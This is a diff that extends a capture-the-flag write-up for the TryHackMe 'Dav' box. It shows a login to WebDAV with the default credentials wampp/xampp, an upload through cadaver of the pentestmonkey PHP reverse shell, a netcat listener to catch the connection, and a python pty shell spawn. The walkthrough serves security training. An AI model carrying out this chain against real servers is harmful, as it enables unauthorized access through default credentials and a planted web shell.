@@ -1,6 +1,6 @@
 # 'Dav' box writeup
 ## Dav is a CTF box created by stuxnet and available on the [TryHackMe platform](https://tryhackme.com).
-## Read about [WebDAV](https://en.wikipedia.org/wiki/WebDAV) and [Dav default credentials](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html)
+## Read about [WebDAV](https://en.wikipedia.org/wiki/WebDAV), [Dav default credentials](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) and [Cadaver, the WebDAV client](https://docs.oracle.com/html/E10235_03/webdav007.htm)
 # ![bg](images/background.jpeg?raw=true "Title")
 
 ## Foothold
@@ -18,7 +18,41 @@
 
 # ![dirb](images/nmap_dirb_scan2.jpg?raw=true "dirb")
 
-**
+**Navigating to the /webdav directory, the login page shows up. We need some credentials, and searching on google we can find some**
+
+# ![login](images/login.png?raw=true "login")
+
+``user: wampp``
+``pass: xampp``
+
++ **After we log in, we can see a file named `passwd.dav` inside the directory**
+
+# ![webdav](images/webdav.jpg?raw=true "webdav")
+
+**Reading the file, it seems to be some credentials with a hashed password. Trying to unhashed it, i realised it's nothing that we can do with it so i continued to read about WebDAV service. It has some similarities with the ftp, among with the cadaver: we can upload some files in that /webdav directory. Let's login with the cadaver, the WebDAV client, using the same default credentials**
+
+``cadaver http://10.10.62.166/webdav/``
+``Username: wampp``
+``Password: xampp``
+
++ **Now, let's try to upload a reverse php shell. I use the [pentestmonkey reverse shell](https://github.com/pentestmonkey/php-reverse-shell). Get it and modify the $ip parameter with your tryhackme tunneled ip and then upload it on our webdav directory**
+
+``put php-reverse-shell.php``
+
+# ![php](images/php-reverse-shell.jpg?raw=true "php")
+
+# ![php](images/uploaded.jpg?raw=true "php")
+
++ **It seems like our reverse shell was uploaded, so let's start a nc listener and access our php shell file**
+
+``nc -lvnp 1234``
+``http://10.10.62.166/webdav/php-reverse-shell.php``
+
+# ![in](images/werein.jpg?raw=true "in")
+
+**And we're in. Let's spawn an interactive shell and read our first flag, located inside the home directory of the merlin user**
+
+``python -c 'import pty;pty.spawn("/bin/bash")'``
 
 
 
